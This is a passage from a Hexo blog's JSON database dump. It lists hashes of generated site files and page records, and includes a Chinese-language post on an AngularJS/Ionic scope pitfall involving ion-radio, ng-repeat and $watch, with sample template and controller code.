e0ff3366d954825278a54308d2ab36d41332e6","modified":1535471470398},{"_id":"public/2016/09/20/read-book-professional-javascript5/index.html","hash":"05eac0765b347f4e17305439e4d826ef2b481d67","modified":1533353844246},{"_id":"public/2016/09/20/read-book-professional-javascript4/index.html","hash":"d8a542791f84288e1857160facbf5082d573c569","modified":1535471470399},{"_id":"public/2016/09/17/read-book-professional-javascript3/index.html","hash":"8813a3fbb51d91db3bd10b8a3ce54df9533b9a2d","modified":1535471470398},{"_id":"public/2016/09/17/read-book-professional-javascript2/index.html","hash":"e014c3eb2e68753145ef8241c1bb465d951a9c7f","modified":1535471470399},{"_id":"public/2016/09/11/read-book-professional-javascript1/index.html","hash":"ad8345aebc4eabfaa5e366649e9253abe5544d01","modified":1535471470399},{"_id":"public/2016/09/08/summary-of-aligning-to-center-solutions-in-css/index.html","hash":"00aeacef7476314a1d8031a55a8050e1a853ef3a","modified":1535471470399},{"_id":"public/2016/08/06/A_Note_About_Developing_A_Hybrid_APP_Which_Supports_for_offline_Take_Photo_And_Uploading_Pictures/index.html","hash":"c2be9f934a7f7cb610391bf6391c2684a291aef9","modified":1533458846357},{"_id":"public/2016/07/11/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch/index.html","hash":"7dcc1a5de4df09ef903f375432c9195c31b92cce","modified":1535471470399},{"_id":"public/2016/07/02/Obstacles_I_Met_When_Using_Hexo/index.html","hash":"e3a6f23a05e83ae320dec22dc7556f98d04591ce","modified":1535471470399},{"_id":"public/2016/06/14/Ionic_AngularJS_Cordova_Hybrid_APP_Developing_Environment_And_Build/index.html","hash":"ccaee91a570bac0a5dc2890d514480a894aa1298","modified":1535471470400},{"_id":"public/2016/06/02/npm ERR! shasum check failed for/index.html","hash":"7347875f31b759923f1eb6d7231f9674f17d9144","modified":1535471470400},{"_id":"public/2016/06/02/Obstacles_I_Met_When_Using_MongoDB/index.html","hash":"0b440e2a90c141e98beb20d3cd8a7f3617013562","modified":1535471470399},{"_id":"public/2016/05/16/Question_About_Onunload/index.html","hash":"0cc6df0b685ad3de1454a203cdd662eab7a893c3","modified":1535471470400},{"_id":"public/archives/index.html","hash":"4ef896248a1a6bf96b61fc2e154d6ed842176e07","modified":1535471470400},{"_id":"public/archives/page/2/index.html","hash":"24bc9746932e935c9313d0ca7119e1bdb2e36a18","modified":1535471470400},{"_id":"public/archives/2016/index.html","hash":"5036b3ed221e717578c48974fe57b63e7254650b","modified":1535471470400},{"_id":"public/archives/2016/page/2/index.html","hash":"c31f0a7f75417facba3fff17de9b41e75652793d","modified":1535471470400},{"_id":"public/archives/2016/06/index.html","hash":"81438de686b583fe7d39c7df53eaf7199b08f018","modified":1535471470400},{"_id":"public/archives/2016/09/index.html","hash":"4dc30eef0de764dfa4dcebeee1695ddb6667f6a4","modified":1535471470400},{"_id":"public/categories/框架/index.html","hash":"3d365cdcd5c212af792483c4180340f577de8557","modified":1535471470400},{"_id":"public/categories/Javascript/index.html","hash":"2962c31a9712a4bd8aa506c769fd2b2e9a24597b","modified":1535471470400},{"_id":"public/index.html","hash":"333bac9b3e872bcae224316027019247207a67e2","modified":1535471470401},{"_id":"public/page/2/index.html","hash":"eeb122b644c3c8bc3a4e1e1c3108fc045cf3eac3","modified":1535471470401},{"_id":"public/tags/红皮书/index.html","hash":"353641f0929cf04a89089a5e6adf94a7003ab293","modified":1535471470401},{"_id":"public/tags/读书笔记/index.html","hash":"18db413ce9d1d1390530dafcf82b4445af14225d","modified":1535471470401},{"_id":"public/tags/Javascript/index.html","hash":"1b19fff0350f1bd37a919da0283d75c077f13079","modified":1535471470401},{"_id":"public/archives/2018/03/index.html","hash":"89a814f39ad530e4e9ed72063c945a44c6d79792","modified":1535471470392},{"_id":"public/2018/03/02/HTTP_cache/index.html","hash":"9470c220c74525e9057de4f37c9ada4289141dec","modified":1535471470398},{"_id":"public/CNAME","hash":"71a73063bb00b58fbab36af21b42dae6a4d27921","modified":1525689470619},{"_id":"public/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1525689470619},{"_id":"public/images/cc-by-nc-nd.svg","hash":"bc3588c9b2d7c68830524783120ff6cf957cf668","modified":1525689470619},{"_id":"public/images/cc-by-nc-sa.svg","hash":"6f55543d1fb9cbc436c101d24f802dec7b41efc3","modified":1525689470619},{"_id":"public/images/cc-by-nc.svg","hash":"6f076713fb9bf934aa2c1046bdf2cf2e37bc1eab","modified":1525689470619},{"_id":"public/images/cc-by-nd.svg","hash":"42cd73da328077ccc92f859bb8f3cf621b3484f8","modified":1525689470620},{"_id":"public/images/cc-by.svg","hash":"e92a33c32d1dac8ed94849b2b4e6456e887efe70","modified":1525689470620},{"_id":"public/images/cc-by-sa.svg","hash":"70c1535f43e54e5ff35ca81419e77e4c0c301398","modified":1525689470620},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525689470620},{"_id":"public/images/cc-zero.svg","hash":"9bfb52b2f63527a7049247bf00d44e6dc1170e7d","modified":1525689470620},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525689470620},{"_id":"public/images/quote-l.svg","hash":"cd108d6f44351cadf8e6742565217f88818a0458","modified":1525689470620},{"_id":"public/images/quote-r.svg","hash":"2a2a250b32a87c69dcc1b1976c74b747bedbfb41","modified":1525689470620},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1525689470620},{"_id":"public/vendors/fastclick/LICENSE","hash":"6f474ea75c42442da7bbcf2e9143ce98258efd8d","modified":1525689470620},{"_id":"public/vendors/font-awesome/HELP-US-OUT.txt","hash":"ed80b43dbc7e3009b2f436741b9796df8eb3be02","modified":1525689470621},{"_id":"public/vendors/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1525689470621},{"_id":"public/vendors/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1525689470621},{"_id":"public/vendors/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1525689470621},{"_id":"public/vendors/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1525689470621},{"_id":"public/vendors/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1525689470621},{"_id":"public/vendors/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1525689470621},{"_id":"public/vendors/font-awesome/css/font-awesome.css.map","hash":"1573904b82807abbb32c97a3632c6c6808eaac50","modified":1525689470621},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.woff2","hash":"574ea2698c03ae9477db2ea3baf460ee32f1a7ea","modified":1525689470621},{"_id":"public/vendors/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1525689470622},{"_id":"public/images/1.jpg","hash":"c2cee17605904e834b37a0d2f5157ecbe66bab4d","modified":1525689471735},{"_id":"public/vendors/font-awesome/fonts/FontAwesome.otf","hash":"0112e96f327d413938d37c1693806f468ffdbace","modified":1525689471738},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.eot","hash":"b3c2f08e73320135b69c23a3908b87a12053a2f6","modified":1525689471741},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.woff","hash":"507970402e328b2baeb05bde73bf9ded4e2c3a2d","modified":1525689471741},{"_id":"public/baidu_verify_D2cu62kugB.html","hash":"ce3a901d2a36f2dba0664e8bc7aea0052e659c34","modified":1525689471766},{"_id":"public/google0a4d6890c1645c94.html","hash":"264f88c54ac21f11e0a813dca4a70caba0c6ff8c","modified":1525689471766},{"_id":"public/js/src/affix.js","hash":"978e0422b5bf1b560236d8d10ebc1adcf66392e3","modified":1525689471767},{"_id":"public/js/src/bootstrap.js","hash":"39bf93769d9080fa01a9a875183b43198f79bc19","modified":1525689471767},{"_id":"public/js/src/hook-duoshuo.js","hash":"a6119070c0119f33e08b29da7d2cce2635eb40a0","modified":1525689471767},{"_id":"public/js/src/motion.js","hash":"269414e84df544a4ccb88519f6abae4943db3c67","modified":1525689471767},{"_id":"public/js/src/post-details.js","hash":"2038f54e289b6da5def09689e69f623187147be5","modified":1525689471768},{"_id":"public/js/src/scrollspy.js","hash":"fe4da1b9fe73518226446f5f27d2831e4426fc35","modified":1525689471768},{"_id":"public/js/src/utils.js","hash":"e5cb720894c4bc28ca8f10b33df127fb394018d9","modified":1525689471768},{"_id":"public/vendors/fastclick/bower.json","hash":"4dcecf83afddba148464d5339c93f6d0aa9f42e9","modified":1525689471768},{"_id":"public/vendors/fastclick/README.html","hash":"da3c74d484c73cc7df565e8abbfa4d6a5a18d4da","modified":1525689471768},{"_id":"public/vendors/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1525689471768},{"_id":"public/vendors/jquery_lazyload/CONTRIBUTING.html","hash":"a6358170d346af13b1452ac157b60505bec7015c","modified":1525689471768},{"_id":"public/vendors/jquery_lazyload/README.html","hash":"bde24335f6bc09d8801c0dcd7274f71b466552bd","modified":1525689471768},{"_id":"public/vendors/jquery_lazyload/bower.json","hash":"ae3c3b61e6e7f9e1d7e3585ad854380ecc04cf53","modified":1525689471768},{"_id":"public/vendors/jquery_lazyload/jquery.scrollstop.js","hash":"0e9a81785a011c98be5ea821a8ed7d411818cfd1","modified":1525689471769},{"_id":"public/vendors/velocity/bower.json","hash":"0ef14e7ccdfba5db6eb3f8fc6aa3b47282c36409","modified":1525689471769},{"_id":"public/vendors/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1525689471769},{"_id":"public/js/src/schemes/pisces.js","hash":"7506e7490c69a200831393c38d25e91c156bd471","modified":1525689471769},{"_id":"public/vendors/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1525689471769},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1525689471769},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1525689471769},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1525689471769},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1525689471769},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1525689471769},{"_id":"public/css/main.css","hash":"72e1f9e8c5815a680029c7bea5c3c861222988e3","modified":1525689471769},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.ttf","hash":"27cf1f2ec59aece6938c7bb2feb0e287ea778ff9","modified":1525689471770},{"_id":"public/vendors/jquery_lazyload/jquery.lazyload.js","hash":"481fd478650e12b67c201a0ea41e92743f8b45a3","modified":1525689471784},{"_id":"public/vendors/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1525689471784},{"_id":"public/vendors/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1525689471785},{"_id":"public/vendors/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1525689471785},{"_id":"public/vendors/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1525689471792},{"_id":"public/vendors/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1525689471807},{"_id":"public/vendors/font-awesome/css/font-awesome.min.css","hash":"05ea25bc9b3ac48993e1fee322d3bc94b49a6e22","modified":1525689471807},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.svg","hash":"f346b8b3df147e4059e1a7d66c52c9a6e1cec3e8","modified":1525689471808},{"_id":"public/vendors/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1525689471821},{"_id":"public/vendors/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1525689471821},{"_id":"public/vendors/font-awesome/css/font-awesome.css","hash":"3b87c2560832748cd06f9bfd2fd6ea8edbdae8c7","modified":1525689471821},{"_id":"public/vendors/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1525689471824},{"_id":"public/vendors/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1525689471828},{"_id":"public/vendors/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1525689471833},{"_id":"source/.DS_Store","hash":"e018c9ec68cabbcacfe51880cb35bc47bb38e3f6","modified":1525745081776},{"_id":"source/_posts/About_Webpack_Optimization.md","hash":"10bf249af9cf2da7b44f57b7321a3be95c1dfe39","modified":1533357107823},{"_id":"source/_posts/.DS_Store","hash":"df2fbeb1400acda0909a32c1cf6bf492f1121e07","modified":1535471349730},{"_id":"source/_posts/_AAAA.post_template.md","hash":"a1b31119176003c8c9d7138e719dcc0792865b77","modified":1525699955341},{"_id":"source/_posts/_About_Meta_Tag.md","hash":"5a77aea163139500274957d9efeba5a6141f0c97","modified":1525701450366},{"_id":"public/archives/2018/08/index.html","hash":"49e3e39e0369a6cbb3683b01d9050c6f2af3a15a","modified":1535471470392},{"_id":"public/tags/Webpack/index.html","hash":"42ada24aaad87c765a04cc7cdcc5fcae6f21810e","modified":1535471470398},{"_id":"public/2018/08/02/About_Webpack_Optimization/index.html","hash":"3b351e4f1e73160273d51b397964492dcdab3d99","modified":1535471470398},{"_id":"source/_posts/_read-book-professional-javascript5.md","hash":"b7fcee316d00226dc8568ee9e1fdf9c818d6405b","modified":1533353813350},{"_id":"source/_posts/note-about-hybridAPP-project.md","hash":"7a1daf45978bc145bb0c3afd53d326c06b224211","modified":1533353813245},{"_id":"public/2016/08/06/note-about-hybridAPP-project/index.html","hash":"b57aa0e3c1d8d657366a13d98a4958c76166d5af","modified":1535471470400},{"_id":"source/_posts/about-HTTPS.md","hash":"c8c3383c5b46bd44619ea39d7c8b6bc8edec452c","modified":1534437030118},{"_id":"public/archives/2018/07/index.html","hash":"b8736a851690b22609c2e83412fbc8fa1ba1c8c8","modified":1535471470392},{"_id":"public/tags/HTTP2/index.html","hash":"6adb781725441b06baaffa29c9ece12f9b0ef31e","modified":1535471470398},{"_id":"public/tags/HTTPS/index.html","hash":"cdbd5d64d40c781e0aec5fe85ab47cdfd7e13464","modified":1535471470398},{"_id":"public/2018/07/02/about-HTTPS/index.html","hash":"38b03f9880c620a8f48185f2644449e0d15dd0e6","modified":1534436794894},{"_id":"public/2018/07/10/about-HTTPS/index.html","hash":"e65aa9cedba64047aa43eead0872ada06002581c","modified":1535471470399},{"_id":"source/_posts/JS-inheritance-and-super-of-ES6.md","hash":"2314acc61d582c71ffb3b944de178d51557f1a2d","modified":1535470520464},{"_id":"public/archives/2018/05/index.html","hash":"c2584a876c54ab293bb48600eede0043ce573e33","modified":1535471470407},{"_id":"public/tags/ES6/index.html","hash":"aaafdd469bc36327bf4b53cd7c20f5f04bcf8f1b","modified":1535471470408},{"_id":"public/2018/05/10/JS-inheritance-and-super-of-ES6/index.html","hash":"e1d0a325e66751fb23c32a88c0f800106e9a4fde","modified":1535471470408}],"Category":[{"name":"框架","_id":"cjgw4444g00048d95hm5i0kxt"},{"name":"Javascript","_id":"cjgw4445w000f8d95xy2fd6os"},{"name":"NodeJS","_id":"cjgw44467000j8d95185yew20"},{"name":"Node.js","_id":"cjgw4446i000m8d95j107fd5q"},{"name":"CSS","_id":"cjgw444b6002i8d95zwqqagm9"},{"name":"http","_id":"cjgw444ex003j8d95dz27vce3"},{"name":"HTTP","_id":"cjgw444fh003o8d95bfcnkz47"}],"Data":[],"Page":[{"title":"about","date":"2016-09-10T03:25:02.000Z","type":"about","comments":0,"_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2016-09-10 11:25:02\ntype: about\ncomments: false\n---\n","updated":"2018-05-07T10:29:59.604Z","path":"about/index.html","layout":"page","_id":"cjgw4444400018d95abmcb54w","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2016-09-10T03:13:07.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2016-09-10 11:13:07\ntype: categories\ncomments: false\n---\n","updated":"2018-05-07T10:29:59.605Z","path":"categories/index.html","layout":"page","_id":"cjgw4444c00038d95r3cjur9r","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tagcloud","date":"2016-09-10T03:06:19.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: Tagcloud\ndate: 2016-09-10 11:06:19\ntype: tags\ncomments: false\n---\n","updated":"2018-05-07T10:29:59.605Z","path":"tags/index.html","layout":"page","_id":"cjgw4444o00078d951stuzar7","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"ion-view、ng-repeat遇到$watch时产生的一个小坑","date":"2016-07-11T13:31:00.000Z","toc":true,"comments":1,"_content":"使用ionic的时候，有这样的一个场景，需要对ion-radio使用ng-rapeat，以生成一个选项列表，并当选择选项的时候，检测值的改变。选项列表是放在一个ion-view中的，这其中涉及多层scope的嵌套：controller有一个顶层scope，ion-view在渲染的时候，会生成一个子scope，ng-repeat又会生成自己的scope，多个scope嵌套起来非常复杂，实现的时候搞得比较久，记录下结果：\n<!-- More -->\n\n## 1、通过$state配置视图的controller 时的写法：##\n### app.js配置： ###\n```\nangular.module('starter',['ionic'])\n    .config(function($stateProvider, $urlRouterProvider){\n        $stateProvider\n            .state('floor',{  \n                url: '/floor',\n                templateUrl: 'templates/floor.html',\n                controller: 'FloorCtrl'\n                })\n\n    });\n```\n### 模板部分写法： ###\n```\n<ion-view>\n    <ion-content>\n        <div>\n            <ion-list>\n                <ion-radio ng-model=\"a.floorModel\" ng-repeat=\"floor in floorItems\" value=\"{{floor}}\">{{floor}}</ion-radio>\n            </ion-list>\n        </div>\n    </ion-content>\n</ion-view>\n```\n\n### controller部分： ###\n```\nangular.module('starter').controller('FloorCtrl', function($scope){\n    $scope.a = {\"floorModel\":\"\"}; \n    $scope.floorItems = ['floorA', 'floorB'];\n\n    $scope.$watch(\"a.floorModel\", function(newVal,oldVal){\n        console.log('floorNewVal:'+ newVal);\n        if(newVal==oldVal){\n            return;\n        }\n        console.log('value change');\n});\n```\n\n## 2、controller写在ion-content上可以减少一层scope  ##\n### 模板部分写法： ###\n```\n<ion-view ng-controller=\"FloorCtrl\">\n    <ion-content>\n        <div>\n            <ion-list>\n                <ion-radio ng-model=\"$parent.floorModel\" ng-repeat=\"floor in floorItems\" value=\"{{floor}}\">{{floor}}</ion-radio>\n            </ion-list>\n        </div>\n    </ion-content>\n</ion-view>\n```\n### controller部分： ###\n```\nangular.module('starter').controller('FloorCtrl', function($scope){\n    $scope.floorModel = ''; \n    $scope.floorItems = ['floorA', 'floorB'];\n\n    $scope.$watch(floorModel, function(newVal,oldVal){\n        console.log('floorNewVal:'+ newVal);\n        if(newVal==oldVal){\n            return;\n        }\n        console.log('value change');\n});\n```\n\n---\n\n## 大坑 ##\n1. 写模板的时候，ion-radio标签的value按照[官网](http://ionicframework.com/docs/api/directive/ionRadio/)介绍作ng-value=\"xxx\"时，会有这样的bug：第一次选择时，总是选列表的最后一项，并且$watch只在值为数字的时候表现正常，按照angularJS的radio的value写法value=\"xxx\"，$watch就表现正常了，而其他页面却没有这个bug，目前实验多次均是这个结论，也算是个大坑了。~~也由此得到的**教训**：出现很奇葩的bug的时候，一定要仔细求证语句写法；~~ 这不能怪本宝宝。\n\n2. 关于第二种写法，即controller写在ion-content上，如果没有用ng-repeat这种会生成child scope的用法时，就不用加$parent了；如果用了就必须加，因为嵌套了两层scope，而把controller写在ion-content上只消除一层scope嵌套。\n\n## 小知识点 ##\n当$watch的第一个参数写成字符串不起作用时，可以这样写，第一个参数写成函数：\n```\n$scope.$watch(function(){return $scope.a.floorModel}, function(newVal, oldVal){});\n```\n\n","source":"_posts/A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch.md","raw":"---\ntitle: ion-view、ng-repeat遇到$watch时产生的一个小坑\ndate: 2016-7-11 21:31:00\ncategories: 框架\ntags: [ionic,angularJS,scope,ion-radio] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n使用ionic的时候，有这样的一个场景，需要对ion-radio使用ng-rapeat，以生成一个选项列表，并当选择选项的时候，检测值的改变。选项列表是放在一个ion-view中的，这其中涉及多层scope的嵌套：controller有一个顶层scope，ion-view在渲染的时候，会生成一个子scope，ng-repeat又会生成自己的scope，多个scope嵌套起来非常复杂，实现的时候搞得比较久，记录下结果：\n<!-- More -->\n\n## 1、通过$state配置视图的controller 时的写法：##\n### app.js配置： ###\n```\nangular.module('starter',['ionic'])\n    .config(function($stateProvider, $urlRouterProvider){\n        $stateProvider\n            .state('floor',{  \n                url: '/floor',\n                templateUrl: 'templates/floor.html',\n                controller: 'FloorCtrl'\n                })\n\n    });\n```\n### 模板部分写法： ###\n```\n<ion-view>\n    <ion-content>\n        <div>\n            <ion-list>\n                <ion-radio ng-model=\"a.floorModel\" ng-repeat=\"floor in floorItems\" value=\"{{floor}}\">{{floor}}</ion-radio>\n            </ion-list>\n        </div>\n    </ion-content>\n</ion-view>\n```\n\n### controller部分： ###\n```\nangular.module('starter').controller('FloorCtrl', function($scope){\n    $scope.a = {\"floorModel\":\"\"}; \n    $scope.floorItems = ['floorA', 'floorB'];\n\n    $scope.$watch(\"a.floorModel\", function(newVal,oldVal){\n        console.log('floorNewVal:'+ newVal);\n        if(newVal==oldVal){\n            return;\n        }\n        console.log('value change');\n});\n```\n\n## 2、controller写在ion-content上可以减少一层scope  ##\n### 模板部分写法： ###\n```\n<ion-view ng-controller=\"FloorCtrl\">\n    <ion-content>\n        <div>\n            <ion-list>\n                <ion-radio ng-model=\"$parent.floorModel\" ng-repeat=\"floor in floorItems\" value=\"{{floor}}\">{{floor}}</ion-radio>\n            </ion-list>\n        </div>\n    </ion-content>\n</ion-view>\n```\n### controller部分： ###\n```\nangular.module('starter').controller('FloorCtrl', function($scope){\n    $scope.floorModel = ''; \n    $scope.floorItems = ['floorA', 'floorB'];\n\n    $scope.$watch(floorModel, function(newVal,oldVal){\n        console.log('floorNewVal:'+ newVal);\n        if(newVal==oldVal){\n            return;\n        }\n        console.log('value change');\n});\n```\n\n---\n\n## 大坑 ##\n1. 写模板的时候，ion-radio标签的value按照[官网](http://ionicframework.com/docs/api/directive/ionRadio/)介绍作ng-value=\"xxx\"时，会有这样的bug：第一次选择时，总是选列表的最后一项，并且$watch只在值为数字的时候表现正常，按照angularJS的radio的value写法value=\"xxx\"，$watch就表现正常了，而其他页面却没有这个bug，目前实验多次均是这个结论，也算是个大坑了。~~也由此得到的**教训**：出现很奇葩的bug的时候，一定要仔细求证语句写法；~~ 这不能怪本宝宝。\n\n2. 关于第二种写法，即controller写在ion-content上，如果没有用ng-repeat这种会生成child scope的用法时，就不用加$parent了；如果用了就必须加，因为嵌套了两层scope，而把controller写在ion-content上只消除一层scope嵌套。\n\n## 小知识点 ##\n当$watch的第一个参数写成字符串不起作用时，可以这样写，第一个参数写成函数：\n```\n$scope.$watch(function(){return $scope.a.floorModel}, function(newVal, oldVal){});\n```\n\n","slug":"A_Hiccup_When_ion-view_And_ng-repeat_Meet_With_$watch","published":1,"updated":"2018-05-07T10:29:59.524Z","layout":"post","photos":[],"link":"","_id":"cjgw4443o00008d953xli2go9","content":"<p>使用ionic的时候，有这样的一个场景，需要对ion-radio使用ng-rapeat，以生成一个选项列表，并当选择选项的时候，检测值的改变。选项列表是放在一个ion-view中的，这其中涉及多层scope的嵌套：controller有一个顶层scope，ion-view在渲染的时候，会生成一个子scope，ng-repeat又会生成自己的scope，多个scope嵌套起来非常复杂，实现的时候搞得比较久，记录下结果：<br><a id=\"more\"></a></p>\n<h2 id=\"1、通过-state配置视图的controller-时的写法：\"><a href=\"#1、通过-state配置视图的controller-时的写法：\" class=\"headerlink\" title=\"1、通过$state配置视图的controller 时的写法：\"></a>1、通过$state配置视图的controller 时的写法：</h2><h3 id=\"app-js配置：\"><a href=\"#app-js配置：\" class=\"headerlink\" title=\"app.js配置：\"></a>app.js配置：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;,[&apos;ionic&apos;])</span><br><span class=\"line\">    .config(function($stateProvider, $urlRouterProvider)&#123;</span><br><span class=\"line\">        $stateProvider</span><br><span class=\"line\">            .state(&apos;floor&apos;,&#123;  </span><br><span class=\"line\">                url: &apos;/floor&apos;,</span><br><span class=\"line\">                templateUrl: &apos;templates/floor.html&apos;,</span><br><span class=\"line\">                controller: &apos;FloorCtrl&apos;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"模板部分写法：\"><a href=\"#模板部分写法：\" class=\"headerlink\" title=\"模板部分写法：\"></a>模板部分写法：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ion-view&gt;</span><br><span class=\"line\">    &lt;ion-content&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">            &lt;ion-list&gt;</span><br><span class=\"line\">                &lt;ion-radio ng-model=&quot;a.floorModel&quot; ng-repeat=&quot;floor in floorItems&quot; value=&quot;&#123;&#123;floor&#125;&#125;&quot;&gt;&#123;&#123;floor&#125;&#125;&lt;/ion-radio&gt;</span><br><span class=\"line\">            &lt;/ion-list&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/ion-content&gt;</span><br><span class=\"line\">&lt;/ion-view&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"controller部分：\"><a href=\"#controller部分：\" class=\"headerlink\" title=\"controller部分：\"></a>controller部分：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">angular.module(&apos;starter&apos;).controller(&apos;FloorCtrl&apos;, function($scope)&#123;</span><br><span class=\"line\">    $scope.a = &#123;&quot;floorModel&quot;:&quot;&quot;&#125;; </span><br><span class=\"line\">    $scope.floorItems = [&apos;floorA&apos;, &apos;floorB&apos;];</span><br><span class=\"line\"></span><br><span class=\"line\">    $scope.$watch(&quot;a.floorModel&quot;, function(newVal,oldVal)&#123;</span><br><span class=\"line\">        console.log(&apos;floorNewVal:&apos;+ newVal);</span><br><span class=\"line\">        if(newVal==oldVal)&#123;</span><br><span class=\"line\">            return;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;value change&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"2、controller写在ion-content上可以减少一层scope\"><a href=\"#2、controller写在ion-content上可以减少一层scope\" class=\"headerlink\" title=\"2、controller写在ion-content上可以减少一层scope\"></a>2、controller写在ion-content上可以减少一层scope</h2><h3 id=\"模板部分写法：-1\"><a href=\"#模板部分写法：-1\" class=\"headerlink\" title=\"模板部分写法：\"></a>模板部分写法：</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;ion-view ng-controller=&quot;FloorCtrl&quot;&gt;</span><br><span class=\"line\">    &lt;ion-content&gt;</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">            &lt;ion-list&gt;</span><br><span class=\"line\">                &lt;ion-radio ng-model=&quot;$parent.floorModel&quot; ng-repeat=&quot;floor in floorItems&quot; value=&quot;&#123;&#123;floor&#125;&#125;&quot;&gt;&#123;&#123;floor&#125;&#125;&lt;/ion-radio&gt;</span><br><span class=\"line\">            &lt;/ion-list&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/ion-content&gt;</span><br><span class=\"line\">&lt;/ion-view&gt;</span><br></pre></td></tr></table></figure>\n<h3 